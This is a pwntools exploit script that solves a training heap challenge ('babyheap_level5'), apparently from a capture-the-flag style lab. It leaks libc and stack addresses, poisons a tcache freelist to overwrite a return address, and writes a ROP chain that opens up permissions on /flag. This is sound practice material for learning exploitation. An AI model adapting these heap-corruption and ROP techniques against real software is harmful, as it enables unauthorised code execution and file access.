#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or '/challenge/babyheap_level5')
os.chdir('/challenge')
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
break print_menu
break *main+352
continue
'''.format(**locals())

io = start()
CHOICE = b"Choice:"
def malloc(p, size, content):
    p.sendline(b"1")
    p.recvuntil(b"chunk?:")
    p.sendline(b"%d" %(size))
    p.recvuntil(b"Content:")
    p.sendline(b"%b" %(content))
    p.recvuntil(CHOICE)

def free(p, index):
    p.sendline(b"3")
    p.recvuntil(b"Index:")
    p.sendline(b"%d" %(index))
    p.recvuntil(CHOICE)

def edit(p, index, content):
    p.sendline(b"2")
    p.recvuntil(b"Index:")
    p.sendline(b"%d" %(index))
    p.recvuntil(b"content:")
    p.sendline(b"%b" %(content)) 
    p.recvuntil(CHOICE)

def arbitary_read(p, value):
    p.sendline(b"7")
    p.recvuntil(b"format):")
    p.sendline(b"%d" %(value))
    p.recvuntil("value is:")
    res = int(p.recvline(keepends=False),16)
    p.recvuntil(CHOICE)
    return res

pop_rdi = 0x2155f
pop_rsi = 0x23e8a
mov_eax = 0x10fbd0  
leave_ret = 0x34d33 

def launch_attack(p):
    libc_base = arbitary_read(p,0x404030)-0xb1690
    env_var = libc_base + 0x3ee098
    env_stack = arbitary_read(p, env_var)
    ret_addr = env_stack-352
    rop = b"/flag\0\0\0" + p64(libc_base+pop_rdi) + p64(ret_addr-8) + p64(libc_base+pop_rsi) + p64(0o777) + p64(libc_base+mov_eax) + p64(libc_base+leave_ret)
    malloc(p, 8, b'a')
    malloc(p, 8, b'a')
    free(p, 1)
    free(p, 0)
    content = b'a'*(0x20-8) + b'\x21'+b'\x00'*7 + p64(ret_addr-8)
    malloc(p, 8, content)
    malloc(p, 8, b'a')
    malloc(p, 8, rop)
    p.interactive()

io.recvuntil(CHOICE)
launch_attack(io)
